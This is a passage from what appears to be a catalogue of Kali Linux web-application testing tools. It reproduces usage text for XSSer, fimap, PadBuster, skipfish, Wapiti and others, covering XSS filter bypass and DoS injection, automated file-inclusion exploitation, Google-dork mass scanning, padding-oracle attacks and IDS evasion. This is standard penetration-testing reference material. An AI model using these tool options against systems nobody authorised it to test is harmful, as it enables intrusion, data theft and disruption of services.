--tcp-nodelay       Use the TCP_NODELAY option
--follow-redirects  XSSer will follow server redirection responses (302)
--follow-limit=FLI  Set how many times XSSer will follow redirections
                    (default 50)
</code></pre>

<p>  <em>Checker Systems</em>:</p>

<pre><code>This options are usefull to know if your target(s) have some filters
against XSS attacks, to reduce 'false positive' results and to perform
more advanced tests:

--no-head           NOT verify the stability of the url (codes: 200|302)
                    with a HEAD pre-check request
--alive=ISALIVE     set limit of every how much errors XSSer must to
                    verify that target is alive
--hash              send an unique hash, without vectors, to pre-check if
                    target(s) repeats all content recieved
--heuristic         launch a heuristic testing to discover which
                    parameters are filtered on target(s) code: ;\/&lt;&gt;"'=
--checkaturl=ALT    check for a valid XSS response from target(s) at an
                    alternative url. 'blind XSS'
--checkmethod=ALTM  check responses from target(s) using a different
                    connection type: GET or POST (default: GET)
--checkatdata=ALD   check responses from target(s) using an alternative
                    payload (default: same than first injection)
--reverse-check     establish a reverse connection from target(s) to XSSer
                    to certificate that is 100% vulnerable
</code></pre>

<p>  <em>Select Vector(s)</em>:</p>

<pre><code>These options can be used to specify a XSS vector source code to
inject in each payload. Important, if you don't want to try to inject
a common XSS vector, used by default. Choose only one option:

--payload=SCRIPT    OWN  - Insert your XSS construction -manually-
--auto              AUTO - Insert XSSer 'reported' vectors from file
                    (HTML5 vectors included!)
</code></pre>

<p>  <em>Select Bypasser(s)</em>:</p>

<pre><code>These options can be used to encode selected vector(s) to try to
bypass possible anti-XSS filters on target(s) code and possible IPS
rules, if the target use it. Also, can be combined with other
techniques to provide encoding:

--Str               Use method String.FromCharCode()
--Une               Use Unescape() function
--Mix               Mix String.FromCharCode() and Unescape()
--Dec               Use Decimal encoding
--Hex               Use Hexadecimal encoding
--Hes               Use Hexadecimal encoding, with semicolons
--Dwo               Encode vectors IP addresses in DWORD
--Doo               Encode vectors IP addresses in Octal
--Cem=CEM           Try -manually- different Character Encoding Mutations
                    (reverse obfuscation: good) -&gt; (ex: 'Mix,Une,Str,Hex')
</code></pre>

<p>  <em>Special Technique(s)</em>:</p>

<pre><code>These options can be used to try to inject code using different type
of XSS techniques. You can choose multiple:

--Coo               COO - Cross Site Scripting Cookie injection
--Xsa               XSA - Cross Site Agent Scripting
--Xsr               XSR - Cross Site Referer Scripting
--Dcp               DCP - Data Control Protocol injections
--Dom               DOM - Document Object Model injections
--Ind               IND - HTTP Response Splitting Induced code
--Anchor            ANC - Use Anchor Stealth payloader (DOM shadows!)
--Phpids            PHP - Exploit PHPIDS bug (0.6.5) to bypass filters
</code></pre>

<p>  <em>Select Final injection(s)</em>:</p>

<pre><code>These options can be used to specify the final code to inject in
vulnerable target(s). Important, if you want to exploit on-the-wild
your discovered vulnerabilities. Choose only one option:

--Fp=FINALPAYLOAD   OWN    - Insert your final code to inject -manually-
--Fr=FINALREMOTE    REMOTE - Insert your final code to inject -remotelly-
--Doss              DOSs   - XSS Denial of service (server) injection
--Dos               DOS    - XSS Denial of service (client) injection
--B64               B64    - Base64 code encoding in META tag (rfc2397)
</code></pre>

<p>  <em>Special Final injection(s)</em>:</p>

<pre><code>These options can be used to execute some 'special' injection(s) in
vulnerable target(s). You can select multiple and combine with your
final code (except with DCP code):

--Onm               ONM - Use onMouseMove() event to inject code
--Ifr               IFR - Use &lt;iframe&gt; source tag to inject code
</code></pre>

<p>  <em>Miscellaneous</em>:</p>

<pre><code>--silent            inhibit console output results
--update            check for XSSer latest stable version
--save              output all results directly to template (XSSlist.dat)
--xml=FILEXML       output 'positives' to aXML file (--xml filename.xml)
--short=SHORTURLS   display -final code- shortered (tinyurl, is.gd)
--launch            launch a browser at the end with each XSS discovered
--tweet             publish each XSS discovered into the 'Grey Swarm!'
--tweet-tags=TT     add more tags to your XSS discovered publications
                    (default: #xss) - (ex: #xsser #vulnerability)
</code></pre>

<p>```</p>

<h3>Web Application Proxies</h3>

<p><strong>paros</strong></p>

<p>A Java based HTTP/HTTPS proxy for assessing web application vulnerability. It supports editing/viewing HTTP messages on-the-fly. Other featuers include spiders, client certificate, proxy-chaining, intelligent scanning for XSS and SQL injections etc.</p>

<p><img class="center" src="/images/kali/webapp/paros.png" title="&lsquo;paros proxy&rsquo; &lsquo;paros&rsquo;" ></p>

<p><strong>proxystrike</strong></p>

<p>ProxyStrike is an active Web Application Proxy. It’s a tool designed to find vulnerabilities while browsing an application.</p>

<p>Right now it has available Sql injection and XSS plugins.</p>

<p><img class="center" src="/images/kali/webapp/proxystrike.png" title="&lsquo;proxystrike&rsquo; &lsquo;proxystrike&rsquo;" ></p>

<p><strong>vega</strong></p>

<p> Vega is a free and open source scanner and testing platform to test the security of web applications. Vega can help you find and validate SQL Injection, Cross-Site Scripting (XSS), inadvertently disclosed sensitive information, and other vulnerabilities. It is written in Java, GUI based, and runs on Linux, OS X, and Windows.</p>

<p>Vega includes an automated scanner for quick tests and an intercepting proxy for tactical inspection. The Vega scanner finds XSS (cross-site scripting), SQL injection, and other vulnerabilities. Vega can be extended using a powerful API in the language of the web: Javascript.</p>

<p><img class="center" src="/images/kali/webapp/vega.png" title="&lsquo;vega&rsquo; &lsquo;vega&rsquo;" ></p>

<h3>Web Crawlers</h3>

<p><strong>apache-users</strong></p>

<p>This Perl script will enumerate the usernames on any system that uses Apache with the UserDir module.</p>

<p><strong>cutycapt</strong></p>

<p>CutyCapt is a small cross-platform command-line utility to capture WebKit’s rendering of a web page into a variety of vector and bitmap formats, including SVG, PDF, PS, PNG, JPEG, TIFF, GIF, and BMP.</p>

<p><img class="center" src="/images/kali/webapp/cutycapt.png" title="&lsquo;cutycapt&rsquo; &lsquo;cutycapt&rsquo;" ></p>

<p><strong>dirb</strong></p>

<p>DIRB  IS  a  Web Content Scanner. It looks for existing (and/or hidden)
Web Objects. It basically works by launching a dictionary basesd attack
against a web server and analizing the response.</p>

<p><img class="center" src="/images/kali/webapp/dirb.png" title="&lsquo;dirb&rsquo; &lsquo;dirb&rsquo;" ></p>

<p><strong>dirbuster</strong></p>

<p>DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers.</p>

<p><img class="center" src="/images/kali/webapp/dirbuster.png" title="&lsquo;dirbuster&rsquo; &lsquo;dirbuster&rsquo;" ></p>

<h3>Web Vulnerability Scanners</h3>

<p><strong>cadaver</strong></p>

<p>A command-line WebDAV client for Unix.</p>

<p>cadaver supports file upload, download,  on-screen  display,  namespace
operations (move and copy), collection creation and deletion, and locking operations.</p>

<p><strong>davtest</strong></p>

<p>DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.</p>

<p>DAVTest supports:</p>

<ul>
<li><p>Automatically send exploit files</p></li>
<li><p>Automatic randomization of directory to help hide files</p></li>
<li><p>Send text files and try MOVE to executable name</p></li>
<li><p>Basic and Digest authorization</p></li>
<li><p>Automatic clean-up of uploaded files</p></li>
<li><p>Send an arbitrary file</p></li>
</ul>


<p><img class="center" src="/images/kali/webapp/davtest.png" title="&lsquo;davtest&rsquo; &lsquo;davtest&rsquo;" ></p>

<p><strong>deblaze</strong></p>

<p>A remote method enumeration tool for flex servers</p>

<p>Deblaze provides the following functionality:</p>

<ul>
<li><p>Brute Force Service and Method Names</p></li>
<li><p>Method Interrogation</p></li>
<li><p>Flex Technology Fingerprinting</p></li>
<li><p>Parameter detection</p></li>
<li><p>Basic parameter fuzzing</p></li>
<li><p>Proxy AMF requests/responses</p></li>
<li><p>HTML reporting</p></li>
</ul>


<p><img class="center" src="/images/kali/webapp/deblaze.png" title="&lsquo;deblaze&rsquo; &lsquo;deblaze&rsquo;" ></p>

<p><strong>fimap</strong></p>

<p>Automatic LFI/RFI scanner and exploiter</p>

<p>``` plain
fimap v.09 (For the Swarm)
:: Automatic LFI/RFI scanner and exploiter
:: by Iman Karim (<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x66;&#x69;&#109;&#97;&#x70;&#x2e;&#x64;&#101;&#118;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;">&#x66;&#x69;&#x6d;&#97;&#x70;&#x2e;&#x64;&#x65;&#118;&#x40;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a>)</p>

<p>Usage: ./fimap.py [options]</p>

<h2>Operating Modes:</h2>

<p>   -s , &mdash;single                 Mode to scan a single URL for FI errors.</p>

<pre><code>                             Needs URL (-u). This mode is the default.
</code></pre>

<p>   -m , &mdash;mass                   Mode for mass scanning. Will check every URL</p>

<pre><code>                             from a given list (-l) for FI errors.
</code></pre>

<p>   -g , &mdash;google                 Mode to use Google to aquire URLs.</p>

<pre><code>                             Needs a query (-q) as google search query.
</code></pre>

<p>   -H , &mdash;harvest                Mode to harvest a URL recursivly for new URLs.</p>

<pre><code>                             Needs a root url (-u) to start crawling there.
                             Also needs (-w) to write a URL list for mass mode.
</code></pre>

<p>   -4 , &mdash;autoawesome            With the AutoAwesome mode fimap will fetch all</p>

<pre><code>                             forms and headers found on the site you defined
                             and tries to find file inclusion bugs thru them. Needs an
                             URL (-u).
</code></pre>

<h2>Techniques:</h2>

<p>   -b , &mdash;enable-blind           Enables blind FI-Bug testing when no error messages are printed.</p>

<pre><code>                             Note that this mode will cause lots of requests compared to the
                             default method. Can be used with -s, -m or -g.
</code></pre>

<p>   -D , &mdash;dot-truncation         Enables dot truncation technique to get rid of the suffix if</p>

<pre><code>                             the default mode (nullbyte poison) failed. This mode can cause
                             tons of requests depending how you configure it.
                             By default this mode only tests windows servers.
                             Can be used with -s, -m or -g. Experimental.
</code></pre>

<p>   -M , &mdash;multiply-term=X        Multiply terminal symbols like &lsquo;.&rsquo; and &lsquo;/&rsquo; in the path by X.</p>

<h2>Variables:</h2>

<p>   -u , &mdash;url=URL                The URL you want to test.</p>

<pre><code>                             Needed in single mode (-s).
</code></pre>

<p>   -l , &mdash;list=LIST              The URL-LIST you want to test.</p>

<pre><code>                             Needed in mass mode (-m).
</code></pre>

<p>   -q , &mdash;query=QUERY            The Google Search QUERY.</p>

<pre><code>                             Example: 'inurl:include.php'
                             Needed in Google Mode (-g)
    --skip-pages=X           Skip the first X pages from the Googlescanner.
</code></pre>

<p>   -p , &mdash;pages=COUNT            Define the COUNT of pages to search (-g).</p>

<pre><code>                             Default is 10.
    --results=COUNT          The count of results the Googlescanner should get per page.
                             Possible values: 10, 25, 50 or 100(default).
    --googlesleep=TIME       The time in seconds the Googlescanner should wait befor each
                             request to google. fimap will count the time between two requests
                             and will sleep if it's needed to reach your cooldown. Default is 5.
</code></pre>

<p>   -w , &mdash;write=LIST             The LIST which will be written if you have choosen</p>

<pre><code>                             harvest mode (-H). This file will be opened in APPEND mode.
</code></pre>

<p>   -d , &mdash;depth=CRAWLDEPTH       The CRAWLDEPTH (recurse level) you want to crawl your target site</p>

<pre><code>                             in harvest mode (-H). Default is 1.
</code></pre>

<p>   -P , &mdash;post=POSTDATA          The POSTDATA you want to send. All variables inside</p>

<pre><code>                             will also be scanned for file inclusion bugs.
    --cookie=COOKIES         Define the cookie which should be send with each request.
                             Also the cookies will be scanned for file inclusion bugs.
                             Concatenate multiple cookies with the ';' character.
    --ttl=SECONDS            Define the TTL (in seconds) for requests. Default is 30 seconds.
    --no-auto-detect         Use this switch if you don't want to let fimap automaticly detect
                             the target language in blind-mode. In that case you will get some
                             options you can choose if fimap isn't sure which lang it is.
    --bmin=BLIND_MIN         Define here the minimum count of directories fimap should walk thru
                             in blind mode. The default number is defined in the generic.xml
    --bmax=BLIND_MAX         Define here the maximum count of directories fimap should walk thru.
    --dot-trunc-min=700      The count of dots to begin with in dot-truncation mode.
    --dot-trunc-max=2000     The count of dots to end with in dot-truncation mode.
    --dot-trunc-step=50      The step size for each round in dot-truncation mode.
    --dot-trunc-ratio=0.095  The maximum ratio to detect if dot truncation was successfull.
    --dot-trunc-also-unix    Use this if dot-truncation should also be tested on unix servers.
    --force-os=OS            Forces fimap to test only files for the OS.
                             OS can be 'unix' or 'windows'
</code></pre>

<h2>Attack Kit:</h2>

<p>   -x , &mdash;exploit                Starts an interactive session where you can</p>

<pre><code>                             select a target and do some action.
</code></pre>

<p>   -T , &mdash;tab-complete           Enables TAB-Completation in exploit mode. Needs readline module.</p>

<pre><code>                             Use this if you want to be able to tab-complete thru remote
                             files\dirs. Eats an extra request for every 'cd' command.
</code></pre>

<h2>Disguise Kit:</h2>

<p>   -A , &mdash;user-agent=UA          The User-Agent which should be sent.</p>

<pre><code>    --http-proxy=PROXY       Setup your proxy with this option. But read this facts:
                               * The googlescanner will ignore the proxy to get the URLs,
                                 but the pentest\attack itself will go thru proxy.
                               * PROXY should be in format like this: 127.0.0.1:8080
                               * It's experimental
    --show-my-ip             Shows your internet IP, current country and user-agent.
                             Useful if you want to test your vpn\proxy config.
</code></pre>

<h2>Plugins:</h2>

<pre><code>    --plugins                List all loaded plugins and quit after that.
</code></pre>

<p>   -I , &mdash;install-plugins        Shows some official exploit-mode plugins you can install</p>

<pre><code>                             and\or upgrade.
</code></pre>

<h2>Other:</h2>

<pre><code>    --update-def             Checks and updates your definition files found in the
                             config directory.
    --test-rfi               A quick test to see if you have configured RFI nicely.
    --merge-xml=XMLFILE      Use this if you have another fimap XMLFILE you want to
                             include to your own fimap_result.xml.
</code></pre>

<p>   -C , &mdash;enable-color           Enables a colorful output. Works only in linux!</p>

<pre><code>    --force-run              Ignore the instance check and just run fimap even if a lockfile
                             exists. WARNING: This may erase your fimap_results.xml file!
</code></pre>

<p>   -v , &mdash;verbose=LEVEL          Verbose level you want to receive.</p>

<pre><code>                             LEVEL=3 -&gt; Debug
                             LEVEL=2 -&gt; Info(Default)
                             LEVEL=1 -&gt; Messages
                             LEVEL=0 -&gt; High-Level
    --credits                Shows some credits.
    --greetings              Some greetings ;)
</code></pre>

<p>   -h , &mdash;help                   Shows this cruft.</p>

<h2>Examples:</h2>

<ol>
<li> Scan a single URL for FI errors:
    ./fimap.py -u &lsquo;<a href="http://localhost/test.php?file=bang&amp;id=23">http://localhost/test.php?file=bang&amp;id=23</a>&rsquo;</li>
<li> Scan a list of URLS for FI errors:
    ./fimap.py -m -l &lsquo;/tmp/urllist.txt&rsquo;</li>
<li> Scan Google search results for FI errors:
    ./fimap.py -g -q &lsquo;inurl:include.php&rsquo;</li>
<li> Harvest all links of a webpage with recurse level of 3 and
 write the URLs to /tmp/urllist
    ./fimap.py -H -u &lsquo;<a href="http://localhost">http://localhost</a>&rsquo; -d 3 -w /tmp/urllist
```</li>
</ol>


<p><strong>grabber</strong></p>

<p>Grabber is a web application scanner. Basically it detects some kind of vulnerabilities in your website. Grabber is simple, not fast but portable and really adaptable. This software is designed to scan small websites such as personals, forums etc. absolutely not big application: it would take too long time and flood your network.</p>

<p>Features:</p>

<ul>
<li><p>Cross-Site Scripting</p></li>
<li><p>SQL Injection (there is also a special Blind SQL Injection module)</p></li>
<li><p>File Inclusion</p></li>
<li><p>Backup files check</p></li>
<li><p>Simple AJAX check (parse every JavaScript and get the URL and try to get the parameters)</p></li>
<li><p>Hybrid analysis/Crystal ball testing for PHP application using PHP-SAT</p></li>
<li><p>JavaScript source code analyzer: Evaluation of the quality/correctness of the JavaScript with JavaScript Lint</p></li>
<li><p>Generation of a file [session_id, time(t)] for next stats analysis.</p></li>
</ul>


<p><img class="center" src="/images/kali/webapp/grabber.png" title="&lsquo;grabber&rsquo; &lsquo;grabber&rsquo;" ></p>

<p><strong>joomscan</strong></p>

<p>Joomla! is probably the most widely-used CMS out there due to its flexibility, user-friendlinesss, extensibility to name a few. So, watching its vulnerabilities and adding such vulnerabilities as KB to Joomla scanner takes ongoing activity. It will help web developers and web masters to help identify possible security weaknesses on their deployed Joomla! sites.</p>

<p>The following features are currently available:</p>

<ul>
<li><p>Exact version Probing (the scanner can tell whether a target is running version 1.5.12)</p></li>
<li><p>Common Joomla! based web application firewall detection</p></li>
<li><p>Searching known vulnerabilities of Joomla! and its components</p></li>
<li><p>Reporting to Text &amp; HTML output</p></li>
<li><p>Immediate update capability via scanner or svn</p></li>
</ul>


<p><img class="center" src="/images/kali/webapp/joomscan.png" title="&lsquo;joomscan&rsquo; &lsquo;joomscan&rsquo;" ></p>

<p><strong>padbuster</strong></p>

<p>PadBuster is a Perl script for automating Padding Oracle Attacks. PadBuster provides the capability to decrypt arbitrary ciphertext, encrypt arbitrary plaintext, and perform automated response analysis to determine whether a request is vulnerable to padding oracle attacks.</p>

<p>``` plain
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| PadBuster &ndash; v0.3.3                        |
| Brian Holyfield &ndash; Gotham Digital Science  |
| <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#108;&#x61;&#x62;&#x73;&#x40;&#x67;&#x64;&#115;&#x73;&#101;&#x63;&#117;&#x72;&#x69;&#x74;&#x79;&#x2e;&#99;&#111;&#x6d;">&#108;&#97;&#x62;&#115;&#64;&#x67;&#100;&#x73;&#x73;&#101;&#99;&#x75;&#x72;&#105;&#116;&#121;&#x2e;&#x63;&#111;&#109;</a>                      |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>

<pre><code>Use: padBuster.pl URL EncryptedSample BlockSize [options]
</code></pre>

<p>  Where: URL = The target URL (and query string if applicable)</p>

<pre><code>     EncryptedSample = The encrypted value you want to test. Must
                       also be present in the URL, PostData or a Cookie
     BlockSize = The block size being used by the algorithm
</code></pre>

<p>Options:</p>

<pre><code> -auth [username:password]: HTTP Basic Authentication 
 -bruteforce: Perform brute force against the first block 
 -ciphertext [Bytes]: CipherText for Intermediate Bytes (Hex-Encoded)
     -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)
     -encoding [0-4]: Encoding Format of Sample (Default 0)
                      0=Base64, 1=Lower HEX, 2=Upper HEX
                      3=.NET UrlToken, 4=WebSafe Base64
     -encodedtext [Encoded String]: Data to Encrypt (Encoded)
     -error [Error String]: Padding Error Message
     -headers [HTTP Headers]: Custom Headers (name1::value1;name2::value2)
 -interactive: Prompt for confirmation on decrypted bytes
 -intermediate [Bytes]: Intermediate Bytes for CipherText (Hex-Encoded)
 -log: Generate log files (creates folder PadBuster.DDMMYY)
 -noencode: Do not URL-encode the payload (encoded by default)
 -noiv: Sample does not include IV (decrypt first block) 
     -plaintext [String]: Plain-Text to Encrypt
     -post [Post Data]: HTTP Post Data String
 -prefix [Prefix]: Prefix bytes to append to each sample (Encoded) 
 -proxy [address:port]: Use HTTP/S Proxy
 -proxyauth [username:password]: Proxy Authentication
 -resume [Block Number]: Resume at this block number
 -usebody: Use response body content for response analysis phase
     -verbose: Be Verbose
     -veryverbose: Be Very Verbose (Debug Only)
</code></pre>

<p>```</p>

<p><strong>skipfish</strong></p>

<p>Skipfish is an active web application security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks. The final report generated by the tool is meant to serve as a foundation for professional web application security assessments.</p>

<p>Key features:</p>

<ul>
<li><p>High speed: pure C code, highly optimized HTTP handling, minimal CPU footprint – easily achieving 2000 requests per second with responsive targets.</p></li>
<li><p>Ease of use: heuristics to support a variety of quirky web frameworks and mixed-technology sites, with automatic learning capabilities, on-the-fly wordlist creation, and form autocompletion.</p></li>
<li><p>Cutting-edge security logic: high quality, low false positive, differential security checks, capable of spotting a range of subtle flaws, including blind injection vectors.</p></li>
</ul>


<p>``` plain
skipfish web application scanner &ndash; version 2.10b
Usage: skipfish [ options &hellip; ] -W wordlist -o output_dir start_url [ start_url2 &hellip; ]</p>

<p>Authentication and access options:</p>

<p>  -A user:pass      &ndash; use specified HTTP authentication credentials
  -F host=IP        &ndash; pretend that &lsquo;host&rsquo; resolves to &lsquo;IP&rsquo;
  -C name=val       &ndash; append a custom cookie to all requests
  -H name=val       &ndash; append a custom HTTP header to all requests
  -b (i|f|p)        &ndash; use headers consistent with MSIE / Firefox / iPhone
  -N                &ndash; do not accept any new cookies
  &mdash;auth-form url   &ndash; form authentication URL
  &mdash;auth-user user  &ndash; form authentication user
  &mdash;auth-pass pass  &ndash; form authentication password
  &mdash;auth-verify-url &ndash;  URL for in-session detection</p>

<p>Crawl scope options:</p>

<p>  -d max_depth     &ndash; maximum crawl tree depth (16)
  -c max_child     &ndash; maximum children to index per node (512)
  -x max_desc      &ndash; maximum descendants to index per branch (8192)
  -r r_limit       &ndash; max total number of requests to send (100000000)
  -p crawl%        &ndash; node and link crawl probability (100%)
  -q hex           &ndash; repeat probabilistic scan with given seed
  -I string        &ndash; only follow URLs matching &lsquo;string&rsquo;
  -X string        &ndash; exclude URLs matching &lsquo;string&rsquo;
  -K string        &ndash; do not fuzz parameters named &lsquo;string&rsquo;
  -D domain        &ndash; crawl cross-site links to another domain
  -B domain        &ndash; trust, but do not crawl, another domain
  -Z               &ndash; do not descend into 5xx locations
  -O               &ndash; do not submit any forms
  -P               &ndash; do not parse HTML, etc, to find new links</p>

<p>Reporting options:</p>

<p>  -o dir          &ndash; write output to specified directory (required)
  -M              &ndash; log warnings about mixed content / non-SSL passwords
  -E              &ndash; log all HTTP/1.0 / HTTP/1.1 caching intent mismatches
  -U              &ndash; log all external URLs and e-mails seen
  -Q              &ndash; completely suppress duplicate nodes in reports
  -u              &ndash; be quiet, disable realtime progress stats
  -v              &ndash; enable runtime logging (to stderr)</p>

<p>Dictionary management options:</p>

<p>  -W wordlist     &ndash; use a specified read-write wordlist (required)
  -S wordlist     &ndash; load a supplemental read-only wordlist
  -L              &ndash; do not auto-learn new keywords for the site
  -Y              &ndash; do not fuzz extensions in directory brute-force
  -R age          &ndash; purge words hit more than &lsquo;age&rsquo; scans ago
  -T name=val     &ndash; add new form auto-fill rule
  -G max_guess    &ndash; maximum number of keyword guesses to keep (256)</p>

<p>  -z sigfile      &ndash; load signatures from this file</p>

<p>Performance settings:</p>

<p>  -g max_conn     &ndash; max simultaneous TCP connections, global (40)
  -m host_conn    &ndash; max simultaneous connections, per target IP (10)
  -f max_fail     &ndash; max number of consecutive HTTP errors (100)
  -t req_tmout    &ndash; total request response timeout (20 s)
  -w rw_tmout     &ndash; individual network I/O timeout (10 s)
  -i idle_tmout   &ndash; timeout on idle HTTP connections (10 s)
  -s s_limit      &ndash; response size limit (400000 B)
  -e              &ndash; do not keep binary responses for reporting</p>

<p>Other settings:</p>

<p>  -l max_req      &ndash; max requests per second (0.000000)
  -k duration     &ndash; stop scanning after the given duration h:m:s
  &mdash;config file   &ndash; load the specified configuration file</p>

<p>Send comments and complaints to <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x68;&#101;&#105;&#x6e;&#x65;&#110;&#110;&#x40;&#103;&#x6f;&#111;&#x67;&#108;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#x68;&#101;&#105;&#x6e;&#101;&#x6e;&#110;&#64;&#103;&#x6f;&#111;&#103;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#109;</a>.
```</p>

<p><strong>uniscan-gui</strong></p>

<p>Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p>

<p><img class="center" src="/images/kali/webapp/uniscan-gui.png" title="&lsquo;uniscan-gui&rsquo; &lsquo;uniscan-gui&rsquo;" ></p>

<p><strong>w3af</strong></p>

<p>w3af is a Web Application Attack and Audit Framework which aims to identify and exploit all web application vulnerabilities. This package provides a graphical user interface (GUI) for the framework. If you want a command-line application only, install w3af-console. The framework has been called the “metasploit for the web”, but it’s actually much more than that, because it also discovers the web application vulnerabilities using black-box scanning techniques!. The w3af core and it’s plugins are fully written in Python. The project has more than 130 plugins, which identify and exploit SQL injection, cross site scripting (XSS), remote file inclusion and more.</p>

<p><img class="center" src="/images/kali/webapp/w3af.png" title="&lsquo;w3af&rsquo; &lsquo;w3af&rsquo;" ></p>

<p><strong>wapiti</strong></p>

<p>It  performs &ldquo;black-box&rdquo; scans, i.e. it does not study the source code of the
application but will scans the webpages of the deployed webapp,  looking  for
scripts and forms where it can inject data.
Once  it gets this list, Wapiti acts like a fuzzer, injecting payloads to see
if a script is vulnerable.</p>

<p>``` plain
Wapiti-SVN &ndash; A web application vulnerability scanner</p>

<p> Usage: python wapiti.py <a href="http://server.com/base/url/">http://server.com/base/url/</a> [options]</p>

<p> Supported options are:
 -s <url>
 &mdash;start <url></p>

<pre><code>To specify an url to start with 
</code></pre>

<p> -x <url>
 &mdash;exclude <url></p>

<pre><code>To exclude an url from the scan (for example logout scripts) 
You can also use a wildcard (*) 
Example : -x http://server/base/?page=*&amp;module=test 
or -x http://server/base/admin/* to exclude a directory 
</code></pre>

<p> -p &lt;url_proxy>
 &mdash;proxy &lt;url_proxy></p>

<pre><code>To specify a proxy 
Example: -p http://proxy:port/ 
</code></pre>

<p> -c &lt;cookie_file>
 &mdash;cookie &lt;cookie_file></p>

<pre><code>To use a cookie 
</code></pre>

<p> -t <timeout>
 &mdash;timeout <timeout></p>

<pre><code>To fix the timeout (in seconds) 
</code></pre>

<p> -a &lt;login%password>
 &mdash;auth &lt;login%password></p>

<pre><code>Set credentials for HTTP authentication 
Doesn't work with Python 2.4 
</code></pre>

<p> -r &lt;parameter_name>
 &mdash;remove &lt;parameter_name></p>

<pre><code>Remove a parameter from URLs 
</code></pre>

<p> -n <limit>
 &mdash;nice <limit></p>

<pre><code>Define a limit of urls to read with the same pattern 
Use this option to prevent endless loops 
Must be greater than 0 
</code></pre>

<p>-m &lt;module_options>
&mdash;module &lt;module_options></p>

<pre><code>Set the modules and HTTP methods to use for attacks.
Example: -m "-all,xss:get,exec:post"
</code></pre>

<p> -u
 &mdash;underline</p>

<pre><code>Use color to highlight vulnerables parameters in output 
</code></pre>

<p> -v <level>
 &mdash;verbose <level></p>

<pre><code>Set the verbosity level 
0: quiet (default), 1: print each url, 2: print every attack 
</code></pre>

<p> -b <scope>
 &mdash;scope <scope></p>

<pre><code>Set the scope of the scan:
    + "page":  to analyse only the page passed in the URL
    + "folder":to analyse all the links to the pages which are in the same folder as the URL passed to Wapiti.
    + "domain":to analyse all the links to the pages which are in the same domain as the URL passed to Wapiti.
If no scope is set, Wapiti scans all the tree under the given URL.
</code></pre>

<p> -f &lt;type_file>
 &mdash;reportType &lt;type_file></p>

<pre><code>Set the type of the report 
xml: Report in XML format 
html: Report in HTML format 
txt: Report in plain text 
</code></pre>

<p> -o <output>
 &mdash;output &lt;output_file></p>

<pre><code>Set the name of the report file 
If the selected report type is 'html', this parameter must be a directory 
</code></pre>

<p> -i <file>
 &mdash;continue <file></p>

<pre><code>This parameter indicates Wapiti to continue with the scan from the specified file, this file should contain data from a previous scan.
The file is optional, if it is not specified, Wapiti takes the default file from the "scans" folder.
</code></pre>

<p> -k <file>
 &mdash;attack <file></p>

<pre><code>This parameter indicates Wapiti to perform attacks without scanning again the website and following the data of this file.
The file is optional, if it is not specified, Wapiti takes the default file from the "scans" folder.
</code></pre>

<p> -h
 &mdash;help</p>

<pre><code>To print this usage message
</code></pre>

<p>```</p>

<p><strong>webshag-gui</strong></p>

<p>Webshag is a multi-threaded, multi-platform web server audit tool. Written in Python, it gathers commonly useful functionalities for web server auditing like website crawling, URL scanning or file fuzzing.
Webshag can be used to scan a web server in HTTP or HTTPS, through a proxy and using HTTP authentication (Basic and Digest). In addition to that it proposes innovative IDS evasion functionalities aimed at making correlation between request more complicated (e.g. use a different random per request HTTP proxy server).</p>

<p><img class="center" src="/images/kali/webapp/webshag-gui.png" title="&lsquo;webshag-gui&rsquo; &lsquo;webshag-gui&rsquo;" ></p>

<p><strong>whatweb</strong></p>

<p>WhatWeb identifies websites. Its goal is to answer the question, “What is that Website?”. WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 900 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.</p>

<p>WhatWeb can be stealthy and fast, or thorough but slow. WhatWeb supports an aggression level to control the trade off between speed and reliability. When you visit a website in your browser, the transaction includes many hints of what web technologies are powering that website. Sometimes a single webpage visit contains enough information to identify a website but when it does not, WhatWeb can interrogate the website further. The default level of aggression, called ‘passive’, is the fastest and requires only one HTTP request of a website. This is suitable for scanning public websites. More aggressive modes were developed for in penetration tests.</p>

<p>Most WhatWeb plugins are thorough and recognise a range of cues from subtle to obvious. For example, most WordPress websites can be identified by the meta HTML tag, e.g. ‘‘, but a minority of WordPress websites remove this identifying tag but this does not thwart WhatWeb. The WordPress WhatWeb plugin has over 15 tests, which include checking the favicon, default installation files, login pages, and checking for “/wp-content/” within relative links.</p>

<p>Features:
* Over 900 plugins</p>

<ul>
<li><p>Control the trade off between speed/stealth and reliability</p></li>
<li><p>Plugins include example URLs</p></li>
<li><p>Performance tuning. Control how many websites to scan concurrently.</p></li>
<li><p>Multiple log formats: Brief (greppable), Verbose (human readable), XML, JSON, MagicTree, RubyObject, MongoDB.</p></li>
<li><p>Recursive web spidering</p></li>
<li><p>Proxy support including TOR</p></li>
<li><p>Custom HTTP headers</p></li>
<li><p>Basic HTTP authentication</p></li>
<li><p>Control over webpage redirection</p></li>
<li><p>Nmap-style IP ranges</p></li>
<li><p>Fuzzy matching</p></li>
<li><p>Result certainty awareness</p></li>
<li><p>Custom plugins defined on the command line</p></li>
</ul>


<p><code>`` plain
.$$$     $.                                   .$$$     $.         
